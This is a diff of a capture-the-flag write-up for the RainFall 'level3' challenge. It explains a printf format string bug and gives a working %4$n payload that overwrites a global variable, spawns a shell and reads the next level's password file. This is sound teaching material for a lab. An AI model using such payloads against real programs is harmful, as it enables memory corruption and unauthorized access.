@@ -1,23 +1,29 @@
-# Level 3 — Format String Vulnerability (Write to Global)
+# level3
 
-## Introduction
-This level introduces format string vulnerabilities. We are given a binary that reads user input via `fgets` and prints it directly using `printf` without a format specifier (e.g. `printf(buffer)` instead of `printf("%s", buffer)`). We must exploit this to modify a global variable `m` to bypass a condition check and spawn a shell.
+Let's start doing the typical recognition.
 
-## Analysis
-The reconstructed C code of the binary is:
+Here is the reconstructed C code of the binary:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
 
-int m = 0; // Global variable
+// Global variable used for the flag/win condition check
+int m = 0; 
 
 void v(void) {
     char local_20c[520];
     
-    fgets(local_20c, 520, stdin);
-    printf(local_20c); // Vulnerable printf
+    // Reads up to 512 (0x200) bytes into the buffer
+    fgets(local_20c, 0x200, stdin);
     
-    if (m == 0x40) { // 0x40 is 64 in decimal
+    // VULNERABILITY: Classic format string bug here!
+    // It passes user input directly to printf without a format specifier like %s.
+    printf(local_20c);
+    
+    // 0x40 is 64 in decimal. 
+    // The goal of this challenge is to use the format string vulnerability 
+    // above to overwrite the global variable 'm' in memory to equal 64.
+    if (m == 0x40) {
         fwrite("Wait what?!\n", 1, 12, stdout);
         system("/bin/sh");
     }
@@ -29,51 +35,86 @@ int main(void) {
 }
 ```
 
-Since `fgets` limits the input size to 520 bytes, we cannot overflow the buffer on the stack to reach the global variable `m` (which is located in the data/BSS section, not on the stack). Instead, we exploit the format string vulnerability in `printf(local_20c)`.
-
-### Format String Exploit Strategy
-Using `printf`, we can use two key mechanisms:
-1. **`%n` specifier:** Writes the number of characters printed so far to the integer pointed to by the corresponding argument on the stack.
-2. **`%[pos]$` parameter selection:** Allows us to specify the exact position of the argument on the stack to use. For example, `%4$n` writes to the 4th argument on the stack.
-
-### Finding the Address of `m`
-We use `gdb` to find the memory address of the global variable `m`:
-```gdb
+Let's check the functions and variables in GDB:
+```text
+(gdb) info functions
+All defined functions:
+...
+0x080484a4  v
+0x0804851a  main
+...
 (gdb) info variable m
 All variables matching regular expression "m":
 
 Non-debugging symbols:
 0x0804988c  m
 ```
-The address of `m` is `0x0804988c`.
 
-### Finding the Stack Offset
-We need to determine where our input string is located relative to the stack arguments processed by `printf`. We pass a distinct marker `aaaa` followed by multiple `%x` specifiers:
-```bash
-level3@RainFall:~$ ./level3
-aaaa %x %x %x %x %x %x
-aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825
-```
-`61616161` (hex representation of `aaaa`) appears as the **4th** output. This indicates that the start of our input buffer resides at argument position **4** on the stack.
+Okay, now as we can see, we got the address of the global variable `m` where we will need to change the value in order to pass the script: `0x0804988c`.
 
-### Designing the Payload
-To set `m` to `64` (decimal):
-1. Place the target address of `m` (`0x0804988c`) at the very start of our format string. This takes up 4 bytes.
-2. Print `60` additional bytes of padding (so that `4 + 60 = 64` characters are printed in total).
-3. Use `%4$n` to write the printed character count (64) to the address located at stack position 4 (which is the beginning of our string, pointing to `m`).
+Now the thing is, we cannot see the overflow input because we got an `fgets` with a limit of `0x200` (512 bytes). We cannot bypass that to do a standard stack buffer overflow to overwrite `m`. So we need something else: the `printf` vulnerability.
 
-## Exploit
-We generate the payload (reversing the target address to little-endian representation `\x8c\x98\x04\x08`):
-```bash
-python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/payload
+This is a format string vulnerability. Let's focus on two key format specifiers:
+1. **`%n`**: Writes the number of characters printed so far to the memory location pointed to by the corresponding argument.
+2. **`%number$`**: Refers to a specific argument number in the argument list.
+
+### How `%n` works:
+It writes to memory the number of characters printed before the flag. For example:
+```c
+int counter = 0;
+printf("this phrase got :%n", &counter); // counter becomes 17
+printf(" %d number of chars\n", counter);
 ```
 
-Run the exploit:
+### How `%number$` works:
+It allows us to select a specific argument from the stack. For example:
+```c
+char *str1 = "here is the str1\n";
+char *str2 = "here is the str2\n";
+char *str3 = "here is the str3\n";
+char *str4 = "here is the str4\n";
+printf("this is the string4: %4$s", str1, str2, str3, str4);
+```
+Result: `this is the string4: here is the str4`
+
+If we call `printf` on our input buffer without passing any arguments, it will read values directly off the stack as if they were arguments. We can exploit this to read and write to the stack.
+
+### Mapping the Stack
+Let's see where our input is placed on the stack by entering multiple `%x` format specifiers:
 ```bash
-(cat /tmp/payload; cat) | ./level3
+level3@RainFall:~$ ./level3 
+%x %x %x %x %x %x %x %x %x %x %x %x
+200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a782520
 ```
 
-Once the shell is spawned, we retrieve the password for `level4`:
+We see a repeating pattern of `25207825` (`% x ` in hex), indicating that our input string is being reflected from the stack.
+To be absolutely sure of the offset, let's prefix it with a distinct marker like `aaaa`:
+```bash
+level3@RainFall:~$ ./level3 
+aaaa %x %x %x %x %x %x %x %x %x %x %x %x
+aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
+```
+As you can see, the value `61616161` (`aaaa`) appears at the **4th** argument position. This means our input buffer starts at argument 4.
+
+### Building the Payload
+- Target Address of `m`: `0x0804988c`
+- Target Value (decimal): `64` (since `0x40` is 64 in decimal)
+- Stack Offset: `4`
+
+We place the 4-byte address of `m` at the beginning of our input string.
+We need the total number of characters printed before `%n` to be exactly 64. Since the address occupies 4 bytes, we print `60` additional bytes of padding.
+Then we use `%4$n` to write the printed count (64) to the address located at the 4th position on the stack (which is the address of `m` at the start of our payload).
+
+Using `[::-1]` to write the target address in little-endian format, we build the payload command:
+```bash
+python -c 'print "\x08\x04\x98\x8c"[::-1] + "A"*60 + "%4$n"' > payload
+```
+
+And run the exploit:
+```bash
+(cat payload; cat) | ./level3
+```
+This spawns a shell, allowing us to read the password for `level4`:
 ```bash
 cat /home/user/level4/.pass
 ```
